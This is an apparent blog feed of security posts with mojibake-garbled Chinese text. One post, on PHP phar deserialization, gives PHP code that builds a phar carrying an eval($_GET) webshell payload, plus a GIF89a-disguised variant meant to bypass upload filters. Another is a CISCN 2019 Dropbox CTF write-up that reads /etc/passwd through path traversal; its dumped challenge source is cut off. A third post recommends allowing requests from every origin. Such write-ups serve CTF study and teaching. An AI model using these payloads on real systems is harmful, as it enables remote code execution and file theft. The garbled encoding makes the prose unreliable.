¹æ®éœ€è¦æ‰©å±•å’Œæ·»åŠ æ›´å¤šçš„æœºå™¨ï¼Œè€Œä¸å¿…æ‹…å¿ƒç”¨æˆ·ç™»å½•çš„ä½ç½®ã€‚</p></blockquote><p>è™½ç„¶è¿™ä¸€å®žçŽ°å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼Œä½†å…¶ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>ç”¨æˆ·æºå¸¦ç”¨æˆ·åå’Œå¯†ç è¯·æ±‚è®¿é—®</li><li>æœåŠ¡å™¨æ ¡éªŒç”¨æˆ·å‡­æ®</li><li>åº”ç”¨æä¾›ä¸€ä¸ªtokenç»™å®¢æˆ·ç«¯</li><li>å®¢æˆ·ç«¯å­˜å‚¨tokenï¼Œå¹¶ä¸”åœ¨éšåŽçš„æ¯ä¸€æ¬¡è¯·æ±‚ä¸­éƒ½å¸¦ç€å®ƒ</li><li>æœåŠ¡å™¨æ ¡éªŒtokenå¹¶è¿”å›žæ•°æ®</li></ol><p>æ³¨æ„ï¼š</p><ol><li>æ¯ä¸€æ¬¡è¯·æ±‚éƒ½éœ€è¦token</li><li>Tokenåº”è¯¥æ”¾åœ¨è¯·æ±‚headerä¸­</li><li>æˆ‘ä»¬è¿˜éœ€è¦å°†æœåŠ¡å™¨è®¾ç½®ä¸ºæŽ¥å—æ¥è‡ªæ‰€æœ‰åŸŸçš„è¯·æ±‚ï¼Œç”¨Access-Control-Allow-Origin: *</li></ol><h2 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h2><p>åŽŸæ–‡ï¼š<a href="https://www.cnblogs.com/cjsblog/p/9277677.html">https://www.cnblogs.com/cjsblog/p/9277677.html</a></p><p><a href="https://jwt.io/">https://jwt.io/</a></p><p><a href="https://scotch.io/tutorials/the-ins-and-outs-of-token-based-authentication#toc-why-tokens-came-around">https://scotch.io/tutorials/the-ins-and-outs-of-token-based-authentication#toc-why-tokens-came-around</a></p><p><a href="https://tools.ietf.org/html/rfc7519#section-3">https://tools.ietf.org/html/rfc7519#section-3</a></p><p><a href="http://blog.leapoahead.com/2015/09/06/understanding-jwt/">http://blog.leapoahead.com/2015/09/06/understanding-jwt/</a></p><p><a href="https://cnodejs.org/topic/557844a8e3cc2f192486a8ff">https://cnodejs.org/topic/557844a8e3cc2f192486a8ff</a></p><p><a href="http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/">http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PharåŽŸç†åŠåˆ©ç”¨</title>
      <link href="2021/07/23/phar-yuan-li-ji-li-yong/"/>
      <url>2021/07/23/phar-yuan-li-ji-li-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="æµåŒ…è£…"><a href="#æµåŒ…è£…" class="headerlink" title="æµåŒ…è£…"></a>æµåŒ…è£…</h2><p>å¤§å¤šæ•°PHPæ–‡ä»¶æ“ä½œå…è®¸ä½¿ç”¨å„ç§URLåè®®åŽ»è®¿é—®æ–‡ä»¶è·¯å¾„ï¼šå¦‚<code>data://</code>ï¼Œ<code>zlib://</code>æˆ–<code>php://</code>ã€‚<br> ä¾‹å¦‚å¸¸è§çš„</p><pre><code>include('php://filter/read=convert.base64-encode/resource=index.php');include('data://text/plain;base64,xxxxxxxxxxxx');</code></pre><p><code>phar://</code>ä¹Ÿæ˜¯æµåŒ…è£…çš„ä¸€ç§</p><h2 id="pharåŽŸç†"><a href="#pharåŽŸç†" class="headerlink" title="pharåŽŸç†"></a>pharåŽŸç†</h2><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p>å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸º<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚</p><h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>åŽ‹ç¼©æ–‡ä»¶çš„å±žæ€§ç­‰ä¿¡æ¯ï¼Œä»¥åºåˆ—åŒ–å­˜å‚¨ã€‚</p><h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p>åŽ‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚</p><h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ã€‚</p><h2 id="å®˜æ–¹æ‰‹å†Œ"><a href="#å®˜æ–¹æ‰‹å†Œ" class="headerlink" title="å®˜æ–¹æ‰‹å†Œ"></a>å®˜æ–¹æ‰‹å†Œ</h2><p>pharçš„æœ¬è´¨æ˜¯ä¸€ç§åŽ‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«åŽ‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±žæ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚</p><h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><p>æ ¹æ®æ–‡ä»¶ç»“æž„æˆ‘ä»¬æ¥è‡ªå·±æž„å»ºä¸€ä¸ªpharæ–‡ä»¶ï¼Œphpå†…ç½®äº†ä¸€ä¸ªPharç±»æ¥å¤„ç†ç›¸å…³æ“ä½œ</p><p><strong>æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚</strong></p><p>å‡è®¾æœ‰test.php:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Testobj</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string">"echo 'ok';"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>ç”Ÿæˆpharçš„test.phar:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">Testobject</span>    <span class="token punctuation">{</span>      <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//åˆ é™¤ä¹‹å‰çš„test.paræ–‡ä»¶(å¦‚æžœæœ‰)</span>    <span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥pharä¸ºåŽç¼€</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//å¼€å§‹å†™æ–‡ä»¶</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//å†™å…¥stub</span>    <span class="token variable">$o</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Testobject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token operator">=</span><span class="token string">'eval($_GET["a"]);'</span><span class="token punctuation">;</span>      <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//æ·»åŠ è¦åŽ‹ç¼©çš„æ–‡ä»¶</span>    <span class="token comment" spellcheck="true">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>è¿™æ ·ï¼Œå½“æˆ‘ä»¬è®¿é—®phar.phpræ—¶ï¼Œå°†ä¼šç”Ÿæˆtest.pharçš„pharæ–‡ä»¶ã€‚ä¹‹åŽå†å°†å…¶ä½œä¸ºå‚æ•°ä¼ åˆ°test.phpä¸­ï¼Œå°±å¯getshell</p><p>ç”¨winhexæ‰“å¼€test.phar:</p><p><img src="/2021/07/23/phar-yuan-li-ji-li-yong/image-20210723025024180.png" alt="image-20210723025024180"></p><p>çœ‹åˆ°meta-dataæ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„</p><p>æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æžpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åŽå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š</p><p><img src="/2021/07/23/phar-yuan-li-ji-li-yong/image-20210723025147550.png" alt="image-20210723025147550"></p><h2 id="å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶"><a href="#å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶" class="headerlink" title="å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶"></a>å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶</h2><p>phpè¯†åˆ«__HALT_COMPILER();?&gt;è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åŽç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åŽç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">Testobject</span>    <span class="token punctuation">{</span>      <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//åˆ é™¤ä¹‹å‰çš„test.paræ–‡ä»¶(å¦‚æžœæœ‰)</span>    <span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥pharä¸ºåŽç¼€</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//å¼€å§‹å†™æ–‡ä»¶</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//è®¾ç½®stubï¼Œå¢žåŠ gifæ–‡ä»¶å¤´</span>    <span class="token variable">$o</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Testobject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token operator">=</span><span class="token string">'eval($_GET["a"]);'</span><span class="token punctuation">;</span>      <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><ol><li>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯</li><li>è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€</li><li>è¦æœ‰æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå¦‚file_exists()ï¼Œfopen()ï¼Œfile_get_contents()ï¼Œfile()</li><li>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æŽ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤</li></ol><h2 id="æ¼æ´žå¤çŽ°"><a href="#æ¼æ´žå¤çŽ°" class="headerlink" title="æ¼æ´žå¤çŽ°"></a>æ¼æ´žå¤çŽ°</h2><p><a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox">CISCN:2019-åŽåŒ—èµ›åŒº-Dropbox</a></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul><li><strong>æ–‡ä»¶æ ‡è¯†ï¼Œå¿…é¡»ä»¥__HALT_COMPILER();?&gt;ç»“å°¾ï¼Œä½†å‰é¢çš„å†…å®¹æ²¡æœ‰é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è½»æ˜“ä¼ªé€ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶æˆ–è€…pdfæ–‡ä»¶æ¥ç»•è¿‡ä¸€äº›ä¸Šä¼ é™åˆ¶ï¼›</strong></li><li><strong>ååºåˆ—åŒ–ï¼Œpharå­˜å‚¨çš„meta-dataä¿¡æ¯ä»¥åºåˆ—åŒ–æ–¹å¼å­˜å‚¨ï¼Œå½“æ–‡ä»¶æ“ä½œå‡½æ•°é€šè¿‡phar://ä¼ªåè®®è§£æžpharæ–‡ä»¶æ—¶å°±ä¼šå°†æ•°æ®ååºåˆ—åŒ–ï¼Œè€Œè¿™æ ·çš„æ–‡ä»¶æ“ä½œå‡½æ•°æœ‰å¾ˆå¤šã€‚</strong></li></ul><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/silence1_/article/details/102683254">https://blog.csdn.net/silence1_/article/details/102683254</a></p><p>â€‹            <a href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN:2019-Dropbox</title>
      <link href="2021/07/22/ciscn-2019-dropbox/"/>
      <url>2021/07/22/ciscn-2019-dropbox/</url>
      
        <content type="html"><![CDATA[<p>æ³¨å†Œç™»å½•åŽéšä¾¿ä¸Šä¼ ä¸€ä¸ªåŽç¼€æ”¹ä¸ºjpgçš„æ–‡ä»¶</p><p><img src="/2021/07/22/ciscn-2019-dropbox/image-20210723032128961.png" alt="image-20210723032128961"></p><p>ç‚¹å‡»ä¸‹è½½</p><p><img src="/2021/07/22/ciscn-2019-dropbox/image-20210723032026577.png" alt="image-20210723032026577"></p><p>æ›´æ”¹postå†…å®¹:</p><pre><code>filename=../../../../../../etc/passwd</code></pre><p><img src="/2021/07/22/ciscn-2019-dropbox/image-20210723032155775.png" alt="image-20210723032155775"></p><p>æœç´¢ä¸åˆ°flag</p><h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h5 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token 